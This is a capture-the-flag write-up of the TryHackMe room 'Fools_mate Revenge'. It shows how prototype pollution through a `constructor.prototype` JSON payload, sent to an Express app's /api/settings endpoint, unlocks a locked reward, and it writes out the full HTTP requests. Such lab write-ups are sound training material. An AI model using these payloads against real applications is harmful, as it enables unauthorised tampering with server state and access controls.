# TryHackMe — Fools_mate Revenge

## Overview

This write-up documents the approach used to solve the **Fools_mate Revenge** room.

The challenge involves a chess-based web application where the reward is deliberately locked for the current session. The investigation focused on understanding how the application determines whether the reward is unlocked and identifying a way to modify that state.

The website uses an Express server and accepts JSON requests. By analyzing the client-side JavaScript and API behavior, I identified a prototype pollution vulnerability that could be used to modify the application's state.

The initial `__proto__` payload did not work. A variation using `constructor.prototype` successfully set the `unlocked` property to `true`. After removing the `sid` cookie and executing the checkmate move again, the application returned the flag.

The main attack path was:

```text
Client-Side Code Analysis
        ↓
Identify Reward Lock
        ↓
Analyze /api/move
        ↓
Identify Session-Based State
        ↓
Test Prototype Pollution
        ↓
__proto__ Payload
        ↓
Failed
        ↓
constructor.prototype Payload
        ↓
Set unlocked = true
        ↓
Remove sid Cookie
        ↓
Execute Checkmate
        ↓
Flag
```

---

# 1. Analyzing the Client-Side Code

The first useful clue was found in the website's JavaScript source code.

I found the following function:

```javascript
function finalize(data) {
  refreshHighlights();
  updateStatus();
  if (data.flag) {
    showFlag(data.flag);
  } else if (data.locked) {
    showSystemNotice(data.message || 'Checkmate! Reward is locked for this account.');
  }
}
```

The important part of the function was:

```javascript
if (data.flag) {
    showFlag(data.flag);
} else if (data.locked) {
    showSystemNotice(data.message || 'Checkmate! Reward is locked for this account.');
}
```

### Reasoning

This indicated that the application had two possible states.

If the server returned a flag:

```text
data.flag
```

the application would display it.

Otherwise, if the reward was locked:

```text
data.locked
```

the application would display the locked message.

This suggested that the reward was deliberately locked for the current account or session.

---

# 2. Identifying the Server Technology

The website uses an Express server.

This was important because the application accepts JSON requests.

Since the application processes JavaScript objects received through JSON, I considered whether object manipulation could affect the application's prototype chain.

This led to investigating the API endpoints and how they handled user-controlled JSON data.

---

# 3. Analyzing the Checkmate Request

The first step was to determine what happened when attempting to checkmate the opponent.

The relevant API endpoint was:

```http
POST /api/move
```

The request contained:

```json
{
  "from": "a1",
  "to": "a8"
}
```

The request was sent to:

```text
10.48.173.59:3000
```

The request used JSON:

```http
Content-Type: application/json
```

### Request

```http
POST /api/move HTTP/1.1
Host: 10.48.173.59:3000
Content-Type: application/json

{"from":"a1","to":"a8"}
```

### Result

The checkmate request did not unlock the reward.

The relevant state indicated that:

```text
session.reward.unlock
```

was not set to `true`.

### Reasoning

This confirmed that performing the checkmate action alone was not sufficient.

There was another condition controlling whether the reward would be unlocked.

This shifted the focus from the chess move itself to the application's session state.

---

# 4. Testing Prototype Pollution

Since the application used an Express server and accepted JSON input, I investigated whether prototype pollution could be used to modify the application's state.

The first payload used the `__proto__` property:

```json
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

### Result

The payload did not work.

### Reasoning

The failed attempt did not necessarily mean that prototype pollution was impossible.

Instead, it suggested that this particular way of manipulating the prototype was not effective against the application's implementation.

I therefore tested an alternative prototype pollution technique.

---

# 5. Using `constructor.prototype`

The next attempt targeted the `/api/settings` endpoint.

The request was:

```http
POST /api/settings HTTP/1.1
Host: 10.48.173.59:3000
Content-Type: application/json
```

The JSON payload was:

```json
{
    "constructor": {
        "prototype": {
            "unlocked": true
        }
    }
}
```

### Reasoning

The payload follows the JavaScript object chain:

```text
constructor
     ↓
prototype
     ↓
unlocked
```

The objective was to introduce:

```text
unlocked = true
```

into the relevant prototype.

The important difference compared with the previous attempt was that instead of using:

```text
__proto__
```

the payload used:

```text
constructor.prototype
```

---

# 6. Successful Prototype Pollution

The `constructor.prototype` payload successfully modified the application state.

The successful payload was:

```json
{
    "constructor": {
        "prototype": {
            "unlocked": true
        }
    }
}
```

This changed the state required for the reward to be considered unlocked.

The successful payload was the key step in the exploitation process.

---

# 7. Removing the Session Cookie

An important part of the successful approach was removing the `sid` cookie.

The reward state was associated with the session, so the session identifier was relevant to how the application determined whether the reward was unlocked.

The `sid` cookie was therefore removed before proceeding with the final checkmate request.

This was an important part of the exploitation chain.

---

# 8. Executing the Checkmate Move

After successfully modifying the application's state and removing the `sid` cookie, I executed the checkmate move again.

The request was sent to:

```http
POST /api/move
```

with:

```json
{
    "from": "a1",
    "to": "a8"
}
```

This time, the application accepted the checkmate action and returned the flag.

---

# Attack Chain

```text
Target Web Application
        |
        v
Analyze Client-Side Code
        |
        v
Identify Reward Lock
        |
        v
Analyze /api/move
        |
        v
session.reward.unlock = false
        |
        v
Identify Express + JSON
        |
        v
Test __proto__
        |
        v
Payload Fails
        |
        v
Test constructor.prototype
        |
        v
unlocked = true
        |
        v
Remove sid Cookie
        |
        v
Execute Checkmate
        |
        v
Flag
```

---

# Commands / Requests Used

## Checkmate Request

```http
POST /api/move HTTP/1.1
Host: 10.48.173.59:3000
Content-Type: application/json

{"from":"a1","to":"a8"}
```

## Failed Prototype Pollution Payload

```json
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

## Successful Prototype Pollution Payload

```http
POST /api/settings HTTP/1.1
Host: 10.48.173.59:3000
Content-Type: application/json

{
    "constructor": {
        "prototype": {
            "unlocked": true
        }
    }
}
```

---

# Tools Used

| Tool                    | Purpose                                   |
| ----------------------- | ----------------------------------------- |
| Browser Developer Tools | Inspect the website source and JavaScript |
| Burp Suite              | Intercept and modify HTTP requests        |
| Burp Repeater           | Test and resend modified API requests     |

---

# Techniques Used

* Client-side JavaScript analysis

* API enumeration

* HTTP request manipulation

* JSON manipulation

* Prototype pollution

* JavaScript prototype chain manipulation

* Session-state analysis

* Burp Suite Repeater

---

# Failed Attempts

## Direct Checkmate

The initial checkmate request did not unlock the reward.

The application indicated that:

```text
session.reward.unlock
```

was not `true`.

This showed that the checkmate action alone was not enough to retrieve the flag.

## `__proto__` Prototype Pollution

The first prototype pollution payload was:

```json
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

This did not work.

Instead of stopping at the failed payload, I tested an alternative prototype pollution technique using `constructor.prototype`.

---

# Key Findings

## 1. The Reward Was Session-Based

The client-side code indicated that the reward could be locked for the current account or session.

The application displayed the flag only when `data.flag` was present. Otherwise, it displayed the locked reward message.

## 2. The Application Used Express

The Express server and JSON-based API requests made prototype manipulation a relevant attack vector.

## 3. The `__proto__` Payload Was Not Effective

The first prototype pollution attempt failed.

This demonstrated that different object-pollution techniques may behave differently depending on how the application processes JSON.

## 4. `constructor.prototype` Was Successful

The following payload successfully modified the application's state:

```json
{
    "constructor": {
        "prototype": {
            "unlocked": true
        }
    }
}
```

This was the key payload used to change the reward state.

## 5. Session Handling Was Important

Removing the `sid` cookie was an important part of the final exploitation process.

After modifying the application state and adjusting the session, the checkmate request returned the flag.

---

# Key Takeaways

## 1. Understand the Application Logic Before Exploiting It

The `finalize()` function provided an important clue about how the application handled the reward.

Rather than immediately attempting random payloads, understanding the application's expected states helped identify what needed to be changed.

## 2. Failed Payloads Can Guide the Next Attempt

The `__proto__` payload did not work.

Instead of concluding that prototype pollution was impossible, I considered alternative ways of reaching the JavaScript prototype chain.

This led to:

```text
__proto__
   ↓
Failed

constructor.prototype
   ↓
Successful
```

## 3. JSON Input Can Be an Attack Surface

The application accepted JSON objects through its API endpoints.

This made object-property manipulation relevant when investigating prototype pollution.

## 4. Session State Matters

Changing an application's state is not always sufficient.

If the application associates sensitive functionality with a session identifier, session handling must also be considered during analysis.

---

# Conclusion

The Fools_mate Revenge room demonstrated how understanding application logic, JSON object handling, JavaScript prototypes, and session state can be combined to bypass a reward restriction.

The investigation started by analyzing the client-side `finalize()` function and identifying that the reward was deliberately locked.

The `/api/move` endpoint was then examined, confirming that the checkmate action alone did not set the required reward state.

Because the application used Express and JSON requests, prototype pollution was investigated. The initial `__proto__` payload failed, but the alternative `constructor.prototype` payload successfully set:

```text
unlocked = true
```

After removing the `sid` cookie, the checkmate move was executed again and the application returned the flag.

The overall methodology was:

```text
Analyze Application
        ↓
Understand Reward Logic
        ↓
Analyze API
        ↓
Identify Session State
        ↓
Test Prototype Pollution
        ↓
Find Working Payload
        ↓
Modify Application State
        ↓
Adjust Session
        ↓
Execute Checkmate
        ↓
Retrieve Flag
```
